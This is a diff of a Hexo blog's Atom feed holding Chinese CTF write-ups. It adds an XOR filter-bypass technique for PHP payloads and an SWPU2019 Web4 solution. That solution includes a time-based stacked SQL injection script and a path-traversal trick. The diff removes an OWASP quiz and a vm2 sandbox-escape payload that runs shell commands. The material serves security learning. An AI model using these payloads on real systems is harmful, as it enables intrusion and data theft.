@@ -6,10 +6,65 @@
   <link href="http://lll-nnn.github.io/atom.xml" rel="self"/>
   
   <link href="http://lll-nnn.github.io/"/>
-  <updated>2021-07-11T13:36:01.649Z</updated>
+  <updated>2021-07-14T00:46:44.558Z</updated>
   <id>http://lll-nnn.github.io/</id>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>异或^</title>
+    <link href="http://lll-nnn.github.io/2021/07/14/%E5%BC%82%E6%88%96/"/>
+    <id>http://lll-nnn.github.io/2021/07/14/%E5%BC%82%E6%88%96/</id>
+    <published>2021-07-13T23:47:42.000Z</published>
+    <updated>2021-07-14T00:46:44.558Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h1><p>异或就是二进制对应位上运算：   </p><pre><code>1^1=0  1^0=10^0=0   </code></pre><p>%ff对应的是十进制的255，二进制就是<code>111111111</code>,所以它与其他异或后再与原来的异或就等于原来的<br><img src="https://ftp.bmp.ovh/imgs/2021/07/a92fa8f2e18a60bf.png">       </p><pre><code><pre><code class="hljs python">res=<span class="hljs-string">&#x27;phpinfo&#x27;</span>     <span class="hljs-comment">##要异或的</span>temp=[]<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res:    temp.append(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i)),<span class="hljs-number">16</span>)^<span class="hljs-number">0xff</span>))<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> temp:    print(j.replace(<span class="hljs-string">&#x27;0x&#x27;</span>,<span class="hljs-string">&#x27;%&#x27;</span>),end=<span class="hljs-string">&#x27;&#x27;</span>)print(<span class="hljs-string">&#x27;^&#x27;</span>+<span class="hljs-string">&#x27;%ff&#x27;</span>*<span class="hljs-built_in">len</span>(temp))</code></pre></code></pre><p><code>phpinfo</code>—-&gt;<code>%8f%97%8f%96%91%99%90^%ff%ff%ff%ff%ff%ff%ff</code>—-&gt;payload:<code>((%8f%97%8f%96%91%99%90)^(%ff%ff%ff%ff%ff%ff%ff))();</code>(每一部分都要括起来)     </p><h2 id="有字符长度限制的话"><a href="#有字符长度限制的话" class="headerlink" title="有字符长度限制的话"></a>有字符长度限制的话</h2><p>比如:    </p><pre><code><pre><code class="hljs php"><span class="hljs-keyword">if</span> ( strlen(count_chars(strtolower($_), <span class="hljs-number">0x3</span>)) &gt; <span class="hljs-number">0xd</span> )    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;you are so close, omg&#x27;</span>);</code></pre></code></pre><p>这个是限定所用的字符种类小于或等于13       </p><p>看看有没有那个字符可以由其它的异或而来    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/07/abd98b027f2cf77f.png">      </p><pre><code><pre><code class="hljs python">res=<span class="hljs-string">&#x27;\&#x27;().;_acdinprst&#x27;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res:    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> res:        <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> res:            <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> res:                <span class="hljs-keyword">if</span>(<span class="hljs-built_in">ord</span>(j)^<span class="hljs-built_in">ord</span>(m)^<span class="hljs-built_in">ord</span>(n)==<span class="hljs-built_in">ord</span>(i)):                    <span class="hljs-keyword">if</span>(j==m <span class="hljs-keyword">or</span> j==n <span class="hljs-keyword">or</span> m==n):                        <span class="hljs-keyword">continue</span>                    <span class="hljs-keyword">else</span>:                        print(i+<span class="hljs-string">&#x27;==&#x27;</span>+j+<span class="hljs-string">&#x27;^&#x27;</span>+m+<span class="hljs-string">&#x27;^&#x27;</span>+n)</code></pre></code></pre><p>这里用三个来异或一个，两个的话太少，不行<br><img src="https://ftp.bmp.ovh/imgs/2021/07/cf8c1d80d192df60.png">        </p><p>随便选三个   </p><pre><code>c==d^n^id==c^i^ni==c^n^dc^%ff===d^n^i^%ff===d^%ff^n^%ff^i^%ff</code></pre><p><code>print_r</code>—&gt;<code>(%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff)</code>—-&gt;加上两串<code>(%ff%ff%ff%ff%ff%ff%ff)</code>—&gt;<code>(%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%ff%ff%ff%ff%ff)</code>—–&gt;将对应位置上的字符修改，比如<code>i</code>在第三位，就把前三串的第三位改成<code>c n d</code>对应的<code>%9c %91 %9b</code>—-&gt;<code>(%8f%8d%9c%91%8b%a0%8d)^(%ff%ff%91%ff%ff%ff%ff)^(%ff%ff%9b%ff%ff%ff%ff)^(%ff%ff%ff%ff%ff%ff%ff)</code>    </p><p>scandir也换后     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/07/7f460d9d7f5b74e8.png">   </p><p>原本十五个，加上<code>%ff</code>，十六个，减三，十三个</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;异或&quot;&gt;&lt;a href=&quot;#异或&quot; class=&quot;headerlink&quot; title=&quot;异或&quot;&gt;&lt;/a&gt;异或&lt;/h1&gt;&lt;p&gt;异或就是二进制对应位上运算：   &lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;1^1=0  
+1^0=1
+0^0=0   &lt;/code&gt;&lt;/pre&gt;
+&lt;</summary>
+      
+    
+    
+    
+    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
+    
+    <category term="or^or" scheme="http://lll-nnn.github.io/categories/CTF/or-or/"/>
+    
+    
+    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
+    
+    <category term="knowledge" scheme="http://lll-nnn.github.io/tags/knowledge/"/>
+    
+    <category term="or^or" scheme="http://lll-nnn.github.io/tags/or-or/"/>
+    
+  </entry>
+  
+  <entry>
+    <title></title>
+    <link href="http://lll-nnn.github.io/2021/07/11/BUU89/"/>
+    <id>http://lll-nnn.github.io/2021/07/11/BUU89/</id>
+    <published>2021-07-11T14:58:38.589Z</published>
+    <updated>2021-07-14T01:07:07.341Z</updated>
+    
+    <content type="html"><![CDATA[<hr><p>title:  [SWPU2019]Web4<br>date:  2021-07-11 22:58:38<br>tags:  [CTF,WP,sql]<br>categories:  [CTF,sql]<br>index_img:  /img/0016.png<br>banner_img:  /img/0015.jpg</p><hr><h2 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h2><p>打开是一个登录框<br><img src="https://ftp.bmp.ovh/imgs/2021/07/29b0021639f71a2e.png">      </p><p>burp抓包加个<code>&#39;</code>发现报错<br><img src="https://ftp.bmp.ovh/imgs/2021/07/f58c9b6d66785aff.png">     </p><p>sql注入了，不过报错显示的是<code>fetch()</code>函数错误     </p><p><a href="https://xz.aliyun.com/t/3950"><code>PDO下的SQL注入</code></a><br>PDO—&gt;php数据对象       </p><p>PDO支持多语句执行，也就是堆叠注入      </p><p>PDO中的query()函数同数据库交互</p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$dbms=<span class="hljs-string">&#x27;mysql&#x27;</span>;$host=<span class="hljs-string">&#x27;192.168.27.61&#x27;</span>;$dbName=<span class="hljs-string">&#x27;test&#x27;</span>;$user=<span class="hljs-string">&#x27;root&#x27;</span>;$pass=<span class="hljs-string">&#x27;root&#x27;</span>;$dsn=<span class="hljs-string">&quot;<span class="hljs-subst">$dbms</span>:host=<span class="hljs-subst">$host</span>;dbname=<span class="hljs-subst">$dbName</span>&quot;</span>;<span class="hljs-keyword">try</span> &#123;    $pdo = <span class="hljs-keyword">new</span> PDO($dsn, $user, $pass);&#125; <span class="hljs-keyword">catch</span> (PDOException $e) &#123;    <span class="hljs-keyword">echo</span> $e;&#125;$sql = <span class="hljs-string">&quot;select * from user where id=1;&quot;</span>;$sql .= <span class="hljs-string">&quot;create table test2 like user&quot;</span>;$stmt = $pdo-&gt;query($sql);<span class="hljs-keyword">while</span>($row=$stmt-&gt;fetch(PDO::FETCH_ASSOC))&#123;    var_dump($row);    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;&#125;</code></pre></code></pre><p>prepare预处理      </p><p><img src="https://ftp.bmp.ovh/imgs/2021/07/fb83bbb774d5c639.png">      </p><p>以此结合十六进制注入    </p><p>找了WP的脚本，但跑不出来-_-</p><pre><code><pre><code class="hljs python">    <span class="hljs-comment">#author: c1e4r</span>    <span class="hljs-keyword">import</span> requests    <span class="hljs-keyword">import</span> json    <span class="hljs-keyword">import</span> time    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>        <span class="hljs-comment">#题目地址</span>        url = <span class="hljs-string">&#x27;&#x27;&#x27;http://568215bc-57ff-4663-a8d9-808ecfb00f7f.node3.buuoj.cn/index.php?r=Login/Login&#x27;&#x27;&#x27;</span>        <span class="hljs-comment">#注入payload</span>        payloads = <span class="hljs-string">&quot;asd&#x27;;set @a=0x&#123;0&#125;;prepare ctftest from @a;execute ctftest-- -&quot;</span>        flag = <span class="hljs-string">&#x27;&#x27;</span>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">30</span>):            <span class="hljs-comment">#查询payload</span>            payload = <span class="hljs-string">&quot;select if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot;</span>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">128</span>):                <span class="hljs-comment">#将构造好的payload进行16进制转码和json转码</span>                datas = &#123;<span class="hljs-string">&#x27;username&#x27;</span>:payloads.<span class="hljs-built_in">format</span>(str_to_hex(payload.<span class="hljs-built_in">format</span>(i,j))),<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;test213&#x27;</span>&#125;                data = json.dumps(datas)                times = time.time()                res = requests.post(url = url, data = data)                <span class="hljs-keyword">if</span> time.time() - times &gt;= <span class="hljs-number">3</span>:                    flag = flag + <span class="hljs-built_in">chr</span>(j)                    print(flag)                    <span class="hljs-keyword">break</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">str_to_hex</span>(<span class="hljs-params">s</span>):</span>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(c)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s])    <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:        main()    ```  得到`glzjin_wants_a_girl_friend.<span class="hljs-built_in">zip</span>`源码     ![](https://ftp.bmp.ovh/imgs/<span class="hljs-number">2021</span>/<span class="hljs-number">07</span>/b7c5c05c1929a09f.png)     `前端应用逻辑的基础在 controller 文件夹下面，而其他文件都是基于 basecontroller.php 所以我们打开 basecontroller.php 文件进行代码审计`          ```php    private $viewPath;        public function loadView($viewName =<span class="hljs-string">&#x27;&#x27;</span>, $viewData = [])        &#123;            $this-&gt;viewPath = BASE_PATH . &quot;/View/&#123;$viewName&#125;.php&quot;;            if(file_exists($this-&gt;viewPath))            &#123;                extract($viewData);                include $this-&gt;viewPath;            &#125;        &#125;</code></pre></code></pre><p><code>extract</code>可以进行变量覆盖     </p><p>找到<code>UserController.php</code>中调用了<code>loadView</code>且第二个参数可控      </p><pre><code><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">actionList</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        $params = $_REQUEST;        $userModel = <span class="hljs-keyword">new</span> UserModel();        $listData = $userModel-&gt;getPageList($params);        <span class="hljs-keyword">$this</span>-&gt;loadView(<span class="hljs-string">&#x27;userList&#x27;</span>, $listData );    &#125;</code></pre></code></pre><p>在<code>userindex.php</code>中</p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($img_file)) &#123;    $img_file = <span class="hljs-string">&#x27;/../favicon.ico&#x27;</span>;&#125;$img_dir = dirname(<span class="hljs-keyword">__FILE__</span>) . $img_file;$img_base64 = imgToBase64($img_dir);<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src=&quot;&#x27;</span> . $img_base64 . <span class="hljs-string">&#x27;&quot;&gt;&#x27;</span>;</code></pre></code></pre><p>所以传入<code>img_file=/../flag.php</code>   </p><p>需要先进入<code>userIndex.php</code>，url中修改<code>r=UserIndex</code>     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/07/f579ea716508e496.png">   </p><p>源码中图片base64解码得到flag</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;hr&gt;
+&lt;p&gt;title:  [SWPU2019]Web4&lt;br&gt;date:  2021-07-11 22:58:38&lt;br&gt;tags:  [CTF,WP,sql]&lt;br&gt;categories:  [CTF,sql]&lt;br&gt;index_img:  /img/0016.png&lt;b</summary>
+      
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>CJBCTF</title>
@@ -572,51 +627,6 @@
       
       
     <summary type="html">&lt;h2 id=&quot;1-1&quot;&gt;&lt;a href=&quot;#1-1&quot; class=&quot;headerlink&quot; title=&quot;1_1&quot;&gt;&lt;/a&gt;1_1&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://img12.360buyimg.com/ddimg/jfs/t1/161519/39/21188</summary>
-      
-    
-    
-    
-    
-    <category term="wp" scheme="http://lll-nnn.github.io/tags/wp/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Nep2</title>
-    <link href="http://lll-nnn.github.io/2021/04/25/nep2/"/>
-    <id>http://lll-nnn.github.io/2021/04/25/nep2/</id>
-    <published>2021-04-25T12:11:54.000Z</published>
-    <updated>2021-04-25T13:22:48.243Z</updated>
-    
-    <content type="html"><![CDATA[<p>视频二：<a href="https://www.hacker101.com/sessions/pentest_owasp">https://www.hacker101.com/sessions/pentest_owasp</a></p><p>1.目前owasp的十大web安全漏洞是哪些？这些漏洞排名是按照漏洞的严重程度排序的还是按照漏洞的常见程度排序的？（2分）</p><pre><code>1. Injection----&gt;注入，Sql，nosql,OS injection,LDAP injection       2. Broken Authentication---&gt;失效的身份认证和会话管理3. Sensitive Data Exposure----&gt;敏感数据泄露4. XXE5. Broken Access Control----&gt;越权6. Security Misconfiguration.---&gt;安全配置   7. XSS8. Insecure Deserialization----&gt;不安全的反序列化9. Using Components with Known Vulnerabilities----&gt;使用不安全的组件 10. Insufficient Logging &amp; Monitoring.----&gt;日志和监控不足严重程度</code></pre><p>2.请翻译一下credential stuffing（1分）</p><pre><code>密码嗅探    </code></pre><p><a href="https://blog.csdn.net/weixin_44549063/article/details/113518965">credential stuffing attack—-&gt;撞库</a></p><p>3.为什么说不充分的日志记录(insufficient logging)也算owasp十大漏洞的一种？他的危害性如何（2分）</p><pre><code>日志记录不足，会使攻击者进一步攻击系统，保持持久性       owasp tenth</code></pre><p>4.请翻阅一下owasp testing guide，以及owasp testing guide check-list，视频说怎么结合这两个文档来学习渗透测试？ 结合你平时渗透过程中的经验，谈谈你的感想。（3分）   </p><pre><code>利用owasp testing guide check-list查找到相关部分进行学习      小白，还没渗透过。。。。。。。。。         </code></pre>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;视频二：&lt;a href=&quot;https://www.hacker101.com/sessions/pentest_owasp&quot;&gt;https://www.hacker101.com/sessions/pentest_owasp&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;1.目前owasp的十大we</summary>
-      
-    
-    
-    
-    
-    <category term="note" scheme="http://lll-nnn.github.io/tags/note/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>JustEscape</title>
-    <link href="http://lll-nnn.github.io/2021/04/25/BUU76/"/>
-    <id>http://lll-nnn.github.io/2021/04/25/BUU76/</id>
-    <published>2021-04-25T09:07:03.000Z</published>
-    <updated>2021-04-25T09:21:54.868Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="js-vm2"><a href="#js-vm2" class="headerlink" title="js vm2"></a>js vm2</h2><p><img src="https://sc01.alicdn.com/kf/H375cdea26ac54e8c8ee6dfdf19c4a90ag.png" alt="01.png">      </p><p>下面两个demo     </p><p>看下<code>run.php</code>     </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>( array_key_exists( <span class="hljs-string">&quot;code&quot;</span>, $_GET ) &amp;&amp; $_GET[ <span class="hljs-string">&#x27;code&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;    $code = $_GET[<span class="hljs-string">&#x27;code&#x27;</span>];    <span class="hljs-keyword">echo</span> <span class="hljs-keyword">eval</span>(code);&#125; <span class="hljs-keyword">else</span> &#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>试了下，感觉什么都执行不了     </p><p>前面提示说<code>真的是 PHP 嘛</code><br>难道不是PHP      </p><p>看下WP   </p><p>是js      </p><p>js还不会，先简单记一下吧，等学学再回来看看     </p><p><a href="https://www.anquanke.com/post/id/207291"><code>js  vm2沙箱逃逸</code></a>      </p><p>payload:   </p><pre><code>code = &#39;(&#39; + function()&#123;    TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();    try&#123;        Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;    &#125;catch(e)&#123;        return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();    &#125;&#125;+&#39;)()&#39;;try&#123;    console.log(new VM().run(code));&#125;catch(x)&#123;    console.log(x);&#125;</code></pre><p>绕过：<code>[&#39;process&#39;, &#39;exec&#39;, &#39;constructor&#39;, &#39;prototype&#39;, &#39;Function&#39;, &#39;&quot;&#39;, &#39;&#39;&#39;]</code>      </p><pre><code>?code=(function ()&#123;    TypeError[`$&#123;`$&#123;`prototyp`&#125;e`&#125;`][`$&#123;`$&#123;`get_proces`&#125;s`&#125;`] = f=&gt;f[`$&#123;`$&#123;`constructo`&#125;r`&#125;`](`$&#123;`$&#123;`return proces`&#125;s`&#125;`)();    try&#123;        Object.preventExtensions(Buffer.from(``)).a = 1;    &#125;catch(e)&#123;        return e[`$&#123;`$&#123;`get_proces`&#125;s`&#125;`](()=&gt;&#123;&#125;).mainModule[`$&#123;`$&#123;`requir`&#125;e`&#125;`](`$&#123;`$&#123;`child_proces`&#125;s`&#125;`)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](`cat /flag`).toString();    &#125;&#125;)()</code></pre>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;js-vm2&quot;&gt;&lt;a href=&quot;#js-vm2&quot; class=&quot;headerlink&quot; title=&quot;js vm2&quot;&gt;&lt;/a&gt;js vm2&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://sc01.alicdn.com/kf/H375cdea26ac54e8c</summary>
       
     
     
